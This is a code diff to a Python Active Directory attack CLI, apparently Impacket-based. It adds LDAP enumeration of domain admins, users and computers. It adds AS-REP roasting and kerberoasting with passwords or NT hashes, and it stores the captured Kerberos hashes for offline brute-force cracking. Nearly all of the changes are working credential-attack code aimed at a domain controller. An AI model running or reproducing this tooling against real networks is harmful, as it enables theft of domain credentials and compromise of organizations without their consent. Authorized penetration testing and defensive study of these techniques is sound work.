@@ -2,12 +2,19 @@ import cmd
 import argparse
 import re
 from pympacket.utils.bruteforce import bruteforce
-from pympacket.attacks.GetNPUsersbak import GetUserNoPreAuth
+#from pympacket.attacks.GetNPUsersbak import GetUserNoPreAuth
 from pympacket.utils.storage import load_storage, save_storage, Storage
 from pympacket.utils.kerberoasting import kerberoast
-from pympacket.models.common import Hash, CrackedUser
+from pympacket.utils.asreproasting import asreproast
+from pympacket.models.common import Hash, CrackedUser, Computer
 from typing import Any
 import os
+from pympacket.utils.raw_ldap_enum import ldap_login
+from pympacket.utils.raw_ldap_enum import domain_sid
+from pympacket.utils.raw_ldap_enum import group_member
+from pympacket.utils.raw_ldap_enum import enum_users
+from pympacket.utils.raw_ldap_enum import enum_computers
+from tabulate import tabulate
 
 def ipv4_address(value):
     # Regular expression to match an IPv4 address (four octets)
@@ -33,8 +40,12 @@ class ImpacketCLI(cmd.Cmd):
         super().__init__()
         self.storage = load_storage()
 
-    def save_hash(self, hash: Hash):
-        user = extract_user(hash)
+    def save_hash(self, data):
+        user = data['username']
+        if 'tgs' in data:
+            hash = Hash(value=data['tgs'], type='tgs')
+        else:
+            hash = Hash(value=data['asrep'], type='asrep')
         if user not in self.storage.found_users:
             self.storage.found_users.append(user)
             self.storage.found_hashes.append(hash)
@@ -46,48 +57,73 @@ class ImpacketCLI(cmd.Cmd):
         self.storage.cracked_hashes.append(CrackedUser(username=extract_user(hash), password=password, hash=hash))
         save_storage(self.storage)
 
-    
+    def save_computer(self, computer_dict):
+        self.storage.computers.append(Computer(name=computer_dict['name'], is_dc=computer_dict['is_dc'], dns_hostname=computer_dict['dns_hostname'],))
+
     def do_enum(self, args):
         """Get hashes of users with no pre-authentication"""
         parser = argparse.ArgumentParser(prog='enum', description='Runs an enumeration test.')
         parser.add_argument('-d', '--domain', type=str, required=True, help='The domain to test.')
-        parser.add_argument('-dcip', '--dc-ip', type=ipv4_address, required=True, help='The ip of the domain controller. (IPv4)')
+        parser.add_argument('-dc-ip', type=ipv4_address, required=True, help='The ip of the domain controller. (IPv4)')
 
         group = parser.add_argument_group()
 
         group.add_argument('-u', '--username', type=str, required=False, help='The username to test.')
         group.add_argument('-p', '--password', type=str, required=False, help='The password to test.')
+        group.add_argument('-nthash', type=str, required=False, help='The NT hash of the user.')
         group.add_argument('-w', '--wordlist', type=str, required=False, help='The wordlist containing the users to test.')
         group.add_argument('-v', '--verbose', type=bool, required=False, help='Whether to print the process or not.')
         group.add_argument('-t', '--type', type=str, choices=['auto', 'asrep', 'spn', 'ldap'] , required=False, default='auto', help='What kind of enumeration to perform.')
+        print()
 
         try:
             args = parser.parse_args(args.split())
-            if not (args.username and args.password) and not args.wordlist:
+            if not (args.username and (args.password or args.nthash)) and not args.wordlist:
                 parser.error("Username and password or a wordlist are required.")
-            if args.type == 'spn' and not (args.username and args.password):
+            if args.type == 'spn' and not (args.username and (args.password or args.nthash)):
                 parser.error("Username and password are required to perform SPNs enumeration.")
-            if args.type == 'ldap' and not (args.username and args.password):
+            if args.type == 'ldap' and not (args.username and (args.password or args.nthash)):
                 parser.error("Username and password are required to perform LDAP enumeration.")
 
+            if args.type == 'spn' or (args.type == 'auto' and args.username and (args.password or args.nthash)):
+                print("Beginning LDAP Enumeration:")
+                conn, domain_base = ldap_login(target=args.dc_ip, user=args.username, password=args.password, domain=args.domain)
+                print(f"Domain SID: {domain_sid(conn, domain_base)}")
+                print()
+                domain_admins = group_member(conn, domain_base, "Domain Admins")
+                print(f"List of Domain Admins:")
+                for user in domain_admins:
+                     print(user)
+                print()
+                users = enum_users(conn, domain_base)
+                print("Domain Users:")
+                print(tabulate(users, headers="keys", tablefmt="grid"))
+                print()
+                print("Domain Computers:")
+                computers = enum_computers(conn, domain_base, dc_ip=args.dc_ip)
+                print(tabulate(computers, headers="keys", tablefmt="grid"))
+                print()
 
-            cmdLineOptions = {"no_pass": True if args.wordlist else False, "usersfile": args.wordlist, "k": False, 'verbose': args.verbose, "dc_host": None, "dc_ip": args.dc_ip}
-
-            npu = GetUserNoPreAuth(username=args.username, password=args.password, domain=args.domain, cmdLineOptions=cmdLineOptions)
-
-            # TODO: Add enumeration for spns users and ldap when with credentials
-
-            hashes = npu.run()
-
-            for hash in hashes:
-                self.save_hash(Hash(value=hash, type='asrep'))
-
-            if args.type == 'spn' or (args.type == 'auto' and args.username and args.password):
-                users = kerberoast(username=args.username, domain=args.domain, dc_ip=args.dc_ip, password=args.password)
+            if args.type == 'asrep' or (args.type == 'auto'):
+                print("Beginning asreproasting:")
+                if (args.username and (args.password or args.nthash)):
+                    users = asreproast(dc_ip=args.dc_ip, username=args.username, password=args.password, nthash=args.nthash, domain=args.domain)
+                else:
+                    users = asreproast(dc_ip=args.dc_ip, domain=args.domain, usersfile=args.wordlist)
+                print("Retrieved asrep for the following users:")
                 for user in users:
-                    self.save_hash(user.hash)
+                    print(user['username'])
+                    self.save_hash(user)
+                print()
 
-            print(f'Found {len(hashes)} vulnerable hashes.')
+            if args.type == 'spn' or (args.type == 'auto' and args.username and (args.password or args.nthash)):
+                print("Beginning kerberoasting")
+                users = kerberoast(username=args.username, domain=args.domain, dc_ip=args.dc_ip, password=args.password, nthash=args.nthash)
+                print("Retrieved tgs for the following spn:")
+                for user in users:
+                    print(user['username'])
+                    self.save_hash(user)
+                print()
 
         except SystemExit:
             print("Invalid arguments. Use 'help enum' for usage details.")
@@ -104,6 +140,7 @@ class ImpacketCLI(cmd.Cmd):
             args = parser.parse_args(args.split())
         except SystemExit:
             print("Invalid arguments. Use 'help bruteforce' for usage details.")
+            return
 
         found_passwords = 0
         
@@ -148,4 +185,3 @@ class ImpacketCLI(cmd.Cmd):
         """Exit the CLI."""
         save_storage(self.storage)
         return True
-    pass
